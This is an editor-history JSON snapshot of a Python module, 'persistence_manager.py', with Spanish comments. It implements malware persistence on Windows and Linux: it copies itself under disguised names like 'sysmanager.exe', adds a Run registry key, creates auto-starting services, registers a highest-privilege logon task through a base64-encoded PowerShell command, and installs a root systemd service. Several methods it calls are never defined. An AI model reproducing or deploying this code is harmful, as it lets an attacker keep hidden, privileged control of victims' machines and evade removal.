{
    "sourceFile": "src/modules/persistence_manager.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 0,
            "patches": [
                {
                    "date": 1740261682302,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                }
            ],
            "date": 1740261682302,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de persistencia avanzada.\r\nImplementa múltiples técnicas para mantener la persistencia en el sistema\r\nutilizando diferentes vectores y mecanismos de supervivencia.\r\n\"\"\"\r\n\r\nimport os\r\nimport sys\r\nimport shutil\r\nimport winreg\r\nimport subprocess\r\nimport base64\r\nimport logging\r\nfrom datetime import datetime\r\nimport platform\r\nimport ctypes\r\nfrom .registry_manager import write_registry_key, delete_registry_key\r\n\r\nclass PersistenceManager:\r\n    def __init__(self):\r\n        \"\"\"Inicializa el administrador de persistencia.\"\"\"\r\n        self.sistema = platform.system().lower()\r\n        self.tecnicas_usadas = []\r\n        self.current_path = os.path.abspath(sys.argv[0])\r\n        \r\n    def establecer_persistencia_completa(self):\r\n        \"\"\"\r\n        Intenta establecer persistencia usando múltiples técnicas.\r\n        Retorna un diccionario con los resultados de cada técnica.\r\n        \"\"\"\r\n        resultados = {\r\n            \"success\": False,\r\n            \"tecnicas_exitosas\": [],\r\n            \"tecnicas_fallidas\": [],\r\n            \"error\": None\r\n        }\r\n        \r\n        try:\r\n            if self.sistema == \"windows\":\r\n                tecnicas = [\r\n                    self._persistencia_registro_run,\r\n                    self._persistencia_registro_runonce,\r\n                    self._persistencia_tarea_programada,\r\n                    self._persistencia_inicio_windows,\r\n                    self._persistencia_wmi,\r\n                    self._persistencia_servicio_windows\r\n                ]\r\n            else:  # Linux\r\n                tecnicas = [\r\n                    self._persistencia_crontab,\r\n                    self._persistencia_systemd,\r\n                    self._persistencia_bashrc,\r\n                    self._persistencia_profile,\r\n                    self._persistencia_init_d\r\n                ]\r\n            \r\n            for tecnica in tecnicas:\r\n                try:\r\n                    resultado = tecnica()\r\n                    if resultado[\"success\"]:\r\n                        resultados[\"tecnicas_exitosas\"].append({\r\n                            \"nombre\": tecnica.__name__,\r\n                            \"detalles\": resultado.get(\"detalles\", \"\")\r\n                        })\r\n                    else:\r\n                        resultados[\"tecnicas_fallidas\"].append({\r\n                            \"nombre\": tecnica.__name__,\r\n                            \"error\": resultado.get(\"error\", \"Error desconocido\")\r\n                        })\r\n                except Exception as e:\r\n                    resultados[\"tecnicas_fallidas\"].append({\r\n                        \"nombre\": tecnica.__name__,\r\n                        \"error\": str(e)\r\n                    })\r\n            \r\n            resultados[\"success\"] = len(resultados[\"tecnicas_exitosas\"]) > 0\r\n            \r\n        except Exception as e:\r\n            resultados[\"error\"] = str(e)\r\n        \r\n        return resultados\r\n\r\n    def _persistencia_registro_run(self):\r\n        \"\"\"Establece persistencia usando el registro Run.\"\"\"\r\n        try:\r\n            nombre_valor = \"SystemManager\"\r\n            ruta_destino = os.path.join(os.environ[\"APPDATA\"], \"System\", \"sysmanager.exe\")\r\n            \r\n            # Crear directorio si no existe\r\n            os.makedirs(os.path.dirname(ruta_destino), exist_ok=True)\r\n            \r\n            # Copiar ejecutable\r\n            shutil.copy2(self.current_path, ruta_destino)\r\n            \r\n            # Añadir al registro\r\n            resultado = write_registry_key(\r\n                \"HKCU\",\r\n                r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\r\n                nombre_valor,\r\n                ruta_destino\r\n            )\r\n            \r\n            if resultado[\"success\"]:\r\n                return {\r\n                    \"success\": True,\r\n                    \"detalles\": f\"Persistencia establecida en {ruta_destino}\"\r\n                }\r\n            else:\r\n                return {\r\n                    \"success\": False,\r\n                    \"error\": resultado.get(\"error\", \"Error al escribir en el registro\")\r\n                }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def _persistencia_servicio_windows(self):\r\n        \"\"\"Establece persistencia creando un servicio de Windows.\"\"\"\r\n        try:\r\n            nombre_servicio = \"SystemHealthManager\"\r\n            ruta_destino = os.path.join(os.environ[\"PROGRAMFILES\"], \"System\", \"healthmanager.exe\")\r\n            \r\n            # Crear directorio y copiar archivo\r\n            os.makedirs(os.path.dirname(ruta_destino), exist_ok=True)\r\n            shutil.copy2(self.current_path, ruta_destino)\r\n            \r\n            # Crear servicio\r\n            cmd = f'sc create \"{nombre_servicio}\" binPath= \"{ruta_destino}\" start= auto'\r\n            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True)\r\n            \r\n            if resultado.returncode == 0:\r\n                # Iniciar servicio\r\n                subprocess.run(f'sc start \"{nombre_servicio}\"', shell=True)\r\n                return {\r\n                    \"success\": True,\r\n                    \"detalles\": f\"Servicio {nombre_servicio} creado y iniciado\"\r\n                }\r\n            else:\r\n                return {\r\n                    \"success\": False,\r\n                    \"error\": resultado.stderr\r\n                }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def _persistencia_wmi(self):\r\n        \"\"\"Establece persistencia usando WMI.\"\"\"\r\n        try:\r\n            nombre_tarea = \"SystemMonitor\"\r\n            script = f\"\"\"\r\n            $Action = New-ScheduledTaskAction -Execute '{self.current_path}'\r\n            $Trigger = New-ScheduledTaskTrigger -AtLogon\r\n            Register-ScheduledTask -TaskName '{nombre_tarea}' -Action $Action -Trigger $Trigger -RunLevel Highest -Force\r\n            \"\"\"\r\n            \r\n            encoded_script = base64.b64encode(script.encode('utf16le')).decode()\r\n            cmd = f'powershell -EncodedCommand {encoded_script}'\r\n            \r\n            resultado = subprocess.run(cmd, shell=True, capture_output=True, text=True)\r\n            \r\n            if resultado.returncode == 0:\r\n                return {\r\n                    \"success\": True,\r\n                    \"detalles\": f\"Tarea WMI {nombre_tarea} creada\"\r\n                }\r\n            else:\r\n                return {\r\n                    \"success\": False,\r\n                    \"error\": resultado.stderr\r\n                }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    # ... Métodos para Linux ...\r\n    def _persistencia_systemd(self):\r\n        \"\"\"Establece persistencia usando systemd.\"\"\"\r\n        try:\r\n            nombre_servicio = \"system-monitor\"\r\n            ruta_servicio = f\"/etc/systemd/system/{nombre_servicio}.service\"\r\n            \r\n            contenido_servicio = f\"\"\"[Unit]\r\nDescription=System Monitor Service\r\nAfter=network.target\r\n\r\n[Service]\r\nType=simple\r\nUser=root\r\nExecStart={self.current_path}\r\nRestart=always\r\n\r\n[Install]\r\nWantedBy=multi-user.target\r\n\"\"\"\r\n            \r\n            # Crear archivo de servicio\r\n            with open(ruta_servicio, 'w') as f:\r\n                f.write(contenido_servicio)\r\n            \r\n            # Recargar systemd y habilitar servicio\r\n            subprocess.run(\"systemctl daemon-reload\", shell=True)\r\n            subprocess.run(f\"systemctl enable {nombre_servicio}\", shell=True)\r\n            subprocess.run(f\"systemctl start {nombre_servicio}\", shell=True)\r\n            \r\n            return {\r\n                \"success\": True,\r\n                \"detalles\": f\"Servicio systemd {nombre_servicio} creado y activado\"\r\n            }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def eliminar_persistencia(self):\r\n        \"\"\"\r\n        Intenta eliminar todas las formas de persistencia establecidas.\r\n        Retorna un diccionario con los resultados de la limpieza.\r\n        \"\"\"\r\n        resultados = {\r\n            \"success\": True,\r\n            \"eliminadas\": [],\r\n            \"errores\": []\r\n        }\r\n        \r\n        # Lista de técnicas de limpieza según el sistema\r\n        if self.sistema == \"windows\":\r\n            tecnicas_limpieza = [\r\n                self._limpiar_registro_run,\r\n                self._limpiar_servicios,\r\n                self._limpiar_tareas_programadas\r\n            ]\r\n        else:\r\n            tecnicas_limpieza = [\r\n                self._limpiar_systemd,\r\n                self._limpiar_crontab,\r\n                self._limpiar_archivos_inicio\r\n            ]\r\n        \r\n        # Ejecutar cada técnica de limpieza\r\n        for tecnica in tecnicas_limpieza:\r\n            try:\r\n                resultado = tecnica()\r\n                if resultado[\"success\"]:\r\n                    resultados[\"eliminadas\"].append(resultado[\"detalles\"])\r\n                else:\r\n                    resultados[\"errores\"].append(resultado[\"error\"])\r\n            except Exception as e:\r\n                resultados[\"errores\"].append(str(e))\r\n        \r\n        resultados[\"success\"] = len(resultados[\"errores\"]) == 0\r\n        return resultados\r\n\r\n    def verificar_persistencia(self):\r\n        \"\"\"\r\n        Verifica qué métodos de persistencia están actualmente establecidos.\r\n        Retorna un diccionario con el estado de cada método.\r\n        \"\"\"\r\n        estado = {\r\n            \"metodos_activos\": [],\r\n            \"metodos_inactivos\": [],\r\n            \"error\": None\r\n        }\r\n        \r\n        try:\r\n            if self.sistema == \"windows\":\r\n                # Verificar registro Run\r\n                if self._verificar_registro_run():\r\n                    estado[\"metodos_activos\"].append(\"Registro Run\")\r\n                else:\r\n                    estado[\"metodos_inactivos\"].append(\"Registro Run\")\r\n                \r\n                # Verificar servicios\r\n                if self._verificar_servicio_windows():\r\n                    estado[\"metodos_activos\"].append(\"Servicio Windows\")\r\n                else:\r\n                    estado[\"metodos_inactivos\"].append(\"Servicio Windows\")\r\n                \r\n                # Verificar tareas programadas\r\n                if self._verificar_tarea_programada():\r\n                    estado[\"metodos_activos\"].append(\"Tarea Programada\")\r\n                else:\r\n                    estado[\"metodos_inactivos\"].append(\"Tarea Programada\")\r\n            \r\n            else:  # Linux\r\n                # Verificar systemd\r\n                if self._verificar_systemd():\r\n                    estado[\"metodos_activos\"].append(\"Systemd Service\")\r\n                else:\r\n                    estado[\"metodos_inactivos\"].append(\"Systemd Service\")\r\n                \r\n                # Verificar crontab\r\n                if self._verificar_crontab():\r\n                    estado[\"metodos_activos\"].append(\"Crontab\")\r\n                else:\r\n                    estado[\"metodos_inactivos\"].append(\"Crontab\")\r\n        \r\n        except Exception as e:\r\n            estado[\"error\"] = str(e)\r\n        \r\n        return estado\r\n"
        }
    ]
}